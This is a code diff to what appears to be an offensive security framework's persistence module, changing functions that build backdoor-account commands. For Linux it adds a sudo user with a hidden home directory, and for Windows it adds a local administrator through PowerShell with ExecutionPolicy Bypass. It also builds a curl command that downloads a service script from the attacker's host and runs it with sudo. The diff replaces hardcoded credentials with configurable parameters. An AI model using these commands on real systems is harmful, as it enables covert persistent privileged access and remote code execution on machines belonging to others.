@@ -187,10 +187,11 @@ class PersistMigratedCommandSet(PendingCommandSet):
 
     def do_grisun0(self, line):
         """
-        Creates and copies a shell command to add a new user `grisun0`, assign a password, add the user to the sudo group, and switch to the user.
+        Creates and copies a shell command to add a new user, assign a password, add the user to the sudo group, and switch to the user.
+        Uses backdoor_username, backdoor_password, and backdoor_linux_home from payload.json.
 
         1. Displays the command:
-            - Prints the command to add the user `grisun0` with home directory `/home/.grisun0`, assign the password, add the user to the `sudo` group, assign the appropriate permissions, and switch to the user.
+            - Prints the command to add the user with the configured home directory, assign the password, add the user to the `sudo` group, assign the appropriate permissions, and switch to the user.
 
         2. Copies the command to clipboard:
             - Uses `xclip` to copy the command to the clipboard for easy pasting.
@@ -202,21 +203,37 @@ class PersistMigratedCommandSet(PendingCommandSet):
         Manual execution:
         To manually execute the command:
         - Copy the command from the clipboard.
-        - Run it in a terminal to create the user and assign up the permissions as specified. useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0
+        - Run it in a terminal to create the user and assign up the permissions as specified.
         Note: Ensure `xclip` is installed and available on your system.
         """
+        username = self.params.get("backdoor_username", "CHANGE_ME")
+        password = self.params.get("backdoor_password", "CHANGE_ME")
+        home_dir = self.params.get("backdoor_linux_home", "/home/.lazyown")
 
-        print_msg("printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
-        os.system("printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
+        if username == "CHANGE_ME" or password == "CHANGE_ME":
+            print_error("backdoor_username and backdoor_password must be set in payload.json")
+            return
+
+        cmd = (
+            f"useradd -m -d {home_dir} -s /bin/bash {username} && "
+            f"echo '{username}:{password}' | chpasswd && "
+            f"usermod -aG sudo {username} && "
+            f"chmod 700 {home_dir} && "
+            f"sudo usermod -aG sudo {username} && "
+            f"su - {username}"
+        )
+        print_msg(f"printf \"{cmd}\" | xclip -sel clip")
+        os.system(f"printf \"{cmd}\" | xclip -sel clip")
         print_warn("Copied to clip ;)")
         return
 
     def do_grisun0w(self, line):
         """
-        Creates and copies a PowerShell command to add a new user `grisun0`, assign a password, add the user to the Administrators group, and switch to the user.
+        Creates and copies a PowerShell command to add a new user, assign a password, add the user to the Administrators group, and switch to the user.
+        Uses backdoor_username and backdoor_password from payload.json.
 
         1. Displays the command:
-            - Prints the PowerShell command to add the user `grisun0`, assign the password, add the user to the `Administrators` group, and switch to the user.
+            - Prints the PowerShell command to add the user, assign the password, add the user to the `Administrators` group, and switch to the user.
 
         2. Copies the command to clipboard:
             - Uses `clip` to copy the command to the clipboard for easy pasting.
@@ -230,16 +247,23 @@ class PersistMigratedCommandSet(PendingCommandSet):
         - Copy the command from the clipboard.
         - Run it in a PowerShell terminal to create the user and assign the permissions as specified.
         """
+        username = self.params.get("backdoor_username", "CHANGE_ME")
+        password = self.params.get("backdoor_password", "CHANGE_ME")
+
+        if username == "CHANGE_ME" or password == "CHANGE_ME":
+            print_error("backdoor_username and backdoor_password must be set in payload.json")
+            return
+
         command = (
-            "powershell $userExists = Get-LocalUser -Name 'grisun0' -ErrorAction SilentlyContinue; "
-            "if ($userExists) { Write-Output 'User grisun0 already exists.' } else { "
-            "$password = 'Grisgrisgris123!'; "
-            "$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
-            "New-LocalUser -Name 'grisun0' -Password $securePassword -FullName 'Grisun0 User' -Description 'Grisun0 User'; }; "
-            "$group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; "
-            "if ($group) { Add-LocalGroupMember -Group 'Administrators' -Member 'grisun0' } else { Write-Output 'Group Administrators was not found.' }; "
-            "Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \\\"/C runas /user:grisun0 cmd.exe\\\"`\"' ; "
-            "net localgroup administrators grisun0 /add"
+            f"powershell $userExists = Get-LocalUser -Name '{username}' -ErrorAction SilentlyContinue; "
+            f"if ($userExists) {{ Write-Output 'User {username} already exists.' }} else {{ "
+            f"$password = '{password}'; "
+            f"$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
+            f"New-LocalUser -Name '{username}' -Password $securePassword -FullName '{username} User' -Description '{username} User'; }}; "
+            f"$group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; "
+            f"if ($group) {{ Add-LocalGroupMember -Group 'Administrators' -Member '{username}' }} else {{ Write-Output 'Group Administrators was not found.' }}; "
+            f"Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \\\"/C runas /user:{username} cmd.exe\\\"`\"' ; "
+            f"net localgroup administrators {username} /add"
         )
 
         copy2clip(command)
@@ -1314,7 +1338,7 @@ class PersistMigratedCommandSet(PendingCommandSet):
             print_error(f"Failed to create service file: {e}")
             return
 
-        password = 'grisgrisgris'
+        password = self.params.get("start_pass", "CHANGE_ME")
         cmd = f"curl http://{self.params['lhost']}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
         print_msg(f"Run the following command to enable and start the service: {cmd}")
 
